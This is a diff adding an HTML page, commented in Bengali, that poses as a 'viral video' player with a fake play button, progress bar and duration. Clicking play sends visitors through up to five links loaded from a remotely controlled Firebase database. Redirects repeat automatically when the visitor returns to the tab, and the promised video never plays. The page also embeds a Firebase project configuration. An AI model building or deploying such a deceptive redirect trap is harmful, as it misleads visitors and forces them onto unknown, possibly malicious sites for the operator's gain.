@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> Viral video Play now</title>
+
+<!-- Firebase JS SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+body{ margin:0; background:black; font-family:Arial; color:white; }
+.topbar{ background:#f1f1f1; color:black; padding:10px; font-weight:bold; }
+
+.video {
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    /* ডাটাবেস থেকে ছবি আসার আগে একটি ডিফল্ট ছবি দিয়ে রাখলাম */
+    background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
+    transition: background-image 0.5s ease-in-out; /* ছবি পরিবর্তন হলে স্মুথলি হবে */
+}
+
+.play {
+    width: 120px; height: 120px; border-radius: 50%; border: 3px solid white;
+    display: flex; justify-content: center; align-items: center;
+    font-size: 50px; box-shadow: 0 0 30px white; cursor: pointer;
+    background: rgba(0, 0, 0, 0.4); 
+}
+
+.controls {
+    position: fixed; bottom: 0; width: 100%; padding: 10px; background: rgba(0,0,0,0.8);
+}
+.progress { height: 6px; background: #333; margin-bottom: 8px; }
+.bar { width: 20%; height: 100%; background: white; }
+.time { display: flex; justify-content: space-between; font-size: 14px; }
+</style>
+</head>
+
+<body>
+
+<div class="video" id="videoBg">
+    <div class="play" onclick="openLink()">▶</div>
+</div>
+
+<div class="controls">
+    <div class="progress"><div class="bar"></div></div>
+    <div class="time"><span>0:11</span><span>8:32</span></div>
+</div>
+
+<script>
+    // আপনার ফায়ারবেস কনফিগ
+    const firebaseConfig = {
+        apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
+        authDomain: "vital-1f05b.firebaseapp.com",
+        databaseURL: "https://vital-1f05b-default-rtdb.firebaseio.com",
+        projectId: "vital-1f05b",
+        storageBucket: "vital-1f05b.firebasestorage.app",
+        messagingSenderId: "992463011532",
+        appId: "1:992463011532:web:708ff147b8e7e1ce5b8c69"
+    };
+
+    // Firebase Initialize
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+    const maxRedirects = 5;
+
+    // ফায়ারবেস থেকে ডাটা নিয়ে আসা
+    function fetchSettings() {
+        console.log("Firebase থেকে ডাটা খোঁজা হচ্ছে...");
+        
+        db.ref('playerSettings').on('value', (snapshot) => {
+            const data = snapshot.val();
+            
+            if (data) {
+                console.log("ডাটা পাওয়া গেছে:", data);
+
+                // যদি অ্যাডমিন প্যানেল থেকে ইমেজের লিংক দেওয়া থাকে, তবে সেটি বসবে
+                if (data.bgImage && data.bgImage.trim() !== "") {
+                    document.getElementById('videoBg').style.backgroundImage = `url('${data.bgImage}')`;
+                    console.log("ব্যাকগ্রাউন্ড ইমেজ সেট হয়েছে!");
+                }
+                
+                // ৫টি লিংক সেভ করা
+                const links = [data.link1, data.link2, data.link3, data.link4, data.link5];
+                sessionStorage.setItem('targetLinks', JSON.stringify(links));
+            } else {
+                console.error("ডাটাবেসে কোনো ডাটা নেই! দয়া করে অ্যাডমিন প্যানেল থেকে ডাটা সেভ করুন।");
+            }
+        }, (error) => {
+            console.error("ডাটাবেস রিড করতে সমস্যা হচ্ছে:", error);
+            alert("Firebase Database Error: রুলস চেক করুন!");
+        });
+    }
+
+    // প্লে বাটনে ক্লিক করলে
+    function openLink() {
+        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
+        let linksData = sessionStorage.getItem('targetLinks');
+        
+        if (!linksData) {
+            alert("ডেটা লোড হচ্ছে, দয়া করে ২ সেকেন্ড অপেক্ষা করুন...");
+            return;
+        }
+
+        let targetLinks = JSON.parse(linksData);
+
+        // যদি লিংকের ঘর খালি থাকে, তবে অটোম্যাটিক পরের লিংকে যাওয়ার চেষ্টা করবে
+        let currentLink = targetLinks[count] || "https://google.com"; // ডিফল্ট লিংক
+
+        if (count < maxRedirects) {
+            sessionStorage.setItem('redirectCount', count + 1);
+            sessionStorage.setItem('expectedBack', 'yes');
+            window.location.href = currentLink; 
+        } 
+        else if (count >= maxRedirects) {
+            alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
+        }
+    }
+
+    // ইউজার ব্যাক করে ফিরে আসলে এই ফাংশন চলবে
+    function handleAutoRedirect() {
+        let expectedBack = sessionStorage.getItem('expectedBack');
+        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
+        let linksData = sessionStorage.getItem('targetLinks');
+
+        if (expectedBack === 'yes' && count > 0 && count < maxRedirects && linksData) {
+            let targetLinks = JSON.parse(linksData);
+            let nextLink = targetLinks[count] || "https://google.com";
+
+            sessionStorage.setItem('redirectCount', count + 1);
+
+            setTimeout(() => {
+                window.location.href = nextLink; 
+            }, 300); 
+        } 
+        else if (count >= maxRedirects) {
+            sessionStorage.removeItem('expectedBack');
+        }
+    }
+
+    window.addEventListener('pageshow', function(event) { handleAutoRedirect(); });
+
+    document.addEventListener("visibilitychange", function() {
+        if (document.visibilityState === 'visible') { handleAutoRedirect(); }
+    });
+
+    // পেজ লোড হলে ডাটা আনবে
+    fetchSettings();
+</script>
+
+</body>
+</html>
